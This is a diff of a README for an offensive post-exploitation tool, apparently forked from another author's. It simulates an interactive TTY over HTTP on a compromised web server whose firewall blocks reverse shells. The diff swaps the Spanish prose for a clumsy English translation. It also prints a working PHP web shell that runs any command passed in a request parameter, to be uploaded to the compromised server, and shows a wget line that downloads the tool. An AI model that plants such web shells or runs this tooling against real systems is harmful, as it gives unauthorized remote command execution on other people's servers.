@@ -4,24 +4,19 @@ wget https://raw.githubusercontent.com/jaumesaa/easier-ttyoverhttp/master/tty_ov
 ```
 *esto es un fork de s4vitar, ¿estamos?*
 --------------------------------------------
-En ocasiones cuando comprometemos un servidor web, hay reglas configuradas (**Ej: iptables**) que nos impiden obtener una Reverse Shell vía Netcat, Python, u otra utilidad.
+Sometimes when we compromise a web server, there are configured rules (**Ex: iptables**) that prevent us from obtaining a Reverse Shell via Netcat, Python, or another utility.
 
-Con esta herramienta, evitamos tener que hacer uso de una reverse shell para
-obtener una TTY posteriormente completamente interactiva. A través de archivos
-'**mkfifo**', jugamos para simular una TTY interactiva sobre HTTP, logrando
-manejarnos sobre el sistema cómodamente sin ningún tipo de problema.
+ With this tool, we avoid having to use a reverse shell to
+ obtain a TTY later fully interactive.  Through files
+ '**mkfifo**', we play to simulate an interactive TTY over HTTP, achieving
+ manage the system comfortably without any type of problem.
 
-Lo único que necesitamos, es subir al servidor comprometido una estructura PHP como la siguiente para ejecutar comandos:
-
+ The only thing we need is to upload a PHP structure like the following to the compromised server to execute commands:
 ```php
 <?php
 	echo shell_exec($_REQUEST['cmd']);
 ?>
 ```
 
-Una vez subido, simplemente ejecutamos el script (Es necesario cambiar la ruta en el script donde se sitúa nuestro script PHP alojado en el servidor vulnerado).
-
-Tras su ejecución, se muestra un ejemplo de su utilidad:
-
-<div style="text-align:center"><img src="https://funkyimg.com/i/2VKJz.png" /></div>
+ After its execution, you'll have an interactive TTY!
 
